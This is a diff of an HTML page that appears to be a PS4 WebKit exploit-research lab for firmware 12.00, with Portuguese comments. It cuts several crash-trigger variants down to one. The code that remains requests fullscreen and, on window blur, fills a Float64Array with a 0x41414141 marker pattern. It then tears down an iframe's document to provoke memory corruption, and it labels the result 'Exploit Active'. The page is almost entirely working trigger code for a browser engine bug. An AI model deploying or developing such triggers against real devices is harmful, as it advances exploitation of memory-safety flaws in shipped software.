@@ -1,92 +1,34 @@
 <!DOCTYPE html>
 <html>
-<head>
-    <meta charset="UTF-8">
-    <title>PS4 Research - Leandro (v12.00)</title>
-</head>
 <body>
-
-    <h1>PS4 WebKit - Alternative Trigger Lab</h1>
-    <p>Target: Firmware 12.00 | Goal: Non-destructive Teardown</p>
-    
-    <div id="status">Status: Ready. Click a button and press OPTIONS.</div>
-    <hr>
-
-    <button onclick="runTest(1)">1. History PushState</button>
-    <p><small>Tenta disparar o crash via serialização de objetos no histórico.</small></p>
-
-    <button onclick="runTest(2)">2. DOM Re-render (Display)</button>
-    <p><small>Força o motor gráfico a reconstruir a árvore de renderização.</small></p>
-
-    <button onclick="runTest(3)">3. Target innerHTML Wipe</button>
-    <p><small>Limpa apenas um container específico em vez da página toda.</small></p>
-
-    <button onclick="runTest(4)">4. Location Hash Trigger</button>
-    <p><small>Dispara eventos de navegação interna (hashchange).</small></p>
-
-    <button onclick="runTest(5)">5. Iframe document.write</button>
-    <p><small>Executa o write apenas dentro de um frame isolado.</small></p>
-
-    <div id="container" style="border:1px solid #ccc; padding:10px; margin-top:20px;">
-        Target Container
-    </div>
+    <button onclick="runIsolatedTest()">Run Iframe Teardown</button>
+    <div id="container"></div>
 
     <script>
-    const PATTERN = 2.121995791e-314; // 0x4141414141414141
-    const status = document.getElementById('status');
-    const container = document.getElementById('container');
-
-    function runTest(type) {
-        status.innerHTML = "<b>Mode " + type + " Active! Enter Fullscreen and press OPTIONS.</b>";
+    function runIsolatedTest() {
+        const container = document.getElementById('container');
+        // Cria o ambiente isolado
+        container.innerHTML = '<iframe id="targetFrame" src="about:blank"></iframe>';
+        const frame = document.getElementById('targetFrame');
         
-        // Entrar em Fullscreen conforme sua sequência de sucesso
-        const el = document.documentElement;
-        if (el.webkitRequestFullscreen) el.webkitRequestFullscreen();
+        // Entra em Fullscreen (Gatilho inicial)
+        if (document.documentElement.webkitRequestFullscreen) 
+            document.documentElement.webkitRequestFullscreen();
 
         window.onblur = function() {
-            // Criando o único Float64Array que você identificou como gatilho
+            // 1. Criar o único Float64Array (Corrupção de 1 objeto)
             const poison = new Float64Array(10);
-            poison.fill(PATTERN);
+            poison.fill(2.121995791e-314); 
 
-            // Seleção do Gatilho Alternativo
-            switch(type) {
-                case 1:
-                    // Altera o histórico sem recarregar a página
-                    history.pushState({data: poison}, "", "#crash" + Math.random());
-                    break;
-                
-                case 2:
-                    // Força re-renderização completa do corpo
-                    document.body.style.display = "none";
-                    setTimeout(() => { document.body.style.display = "block"; }, 10);
-                    break;
-                
-                case 3:
-                    // Destruição localizada de elementos
-                    container.innerHTML = "";
-                    container.innerText = "Teardown Localizado Executado.";
-                    break;
-                
-                case 4:
-                    // Navegação interna por âncora
-                    location.hash = "trigger" + Math.random();
-                    break;
-                
-                case 5:
-                    // document.write apenas no Iframe
-                    container.innerHTML = '<iframe id="testFrame"></iframe>';
-                    const frame = document.getElementById('testFrame');
-                    const fDoc = frame.contentWindow.document;
-                    fDoc.open();
-                    fDoc.write("<html><body><h1>Iframe Crash</h1></body></html>");
-                    fDoc.close();
-                    break;
-            }
+            // 2. TEARDOWN ISOLADO (Substituindo o document.write da página toda)
+            const frameDoc = frame.contentWindow.document;
+            frameDoc.open();
+            frameDoc.write("<h1>Exploit Active</h1>");
+            frameDoc.close();
             
-            console.log("Gatilho " + type + " executado no blur.");
+            console.log("Teardown executado apenas no Iframe.");
         };
     }
     </script>
-
 </body>
 </html>
